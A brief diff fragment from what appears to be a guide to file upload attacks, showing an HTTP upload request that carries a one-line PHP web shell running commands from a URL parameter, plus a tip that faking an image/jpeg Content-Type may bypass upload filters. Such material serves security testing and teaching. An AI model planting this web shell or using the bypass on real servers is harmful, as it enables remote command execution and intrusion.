@@ -106,10 +106,11 @@ Host: targetapp.com
 Content-Type: application/x-httpd-php
 
 <?=`$_GET[0]`?>
-
 ```
 
+
 > On changing the `Content-Type` to `image/jpeg` the content-type filter may be bypassed
+
 
 ```http
 POST /upload.php HTTP/1.1
